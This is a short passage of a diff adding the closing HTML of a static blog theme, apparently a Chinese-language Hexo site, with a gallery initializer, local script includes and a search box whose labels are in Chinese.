+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
